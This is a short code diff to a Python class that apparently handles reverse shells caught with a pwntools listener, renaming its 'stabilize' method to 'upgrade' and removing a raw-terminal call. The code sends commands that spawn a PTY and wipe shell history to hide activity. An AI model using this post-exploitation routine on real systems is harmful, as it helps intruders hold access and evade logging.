@@ -1,4 +1,4 @@
-import requests, sys, tty
+import requests
 from config import SHELL_STABILIZATION_METHODS
 from pwnlib.tubes.listen import listen
 
@@ -23,7 +23,7 @@ class ShellService:
         except requests.exceptions.ReadTimeout:
             pass
     
-    def stabilize_shell(self, shell: listen):
+    def upgrade_shell(self, shell: listen):
         shell.sendline(b'export HISTFILE=/dev/null') # Avoid history
         # Get pty
         shell.sendline(f'{self.find_pty_spawn_vector(shell)}; exit'.encode())
@@ -35,8 +35,6 @@ class ShellService:
         shell.sendline(b'export TERM=xterm')
         shell.sendline(b'history -c')
         shell.clean()
-
-        tty.setraw(sys.stdin.fileno())
     
     def find_pty_spawn_vector(self, shell: listen) -> str:
         shell.clean()
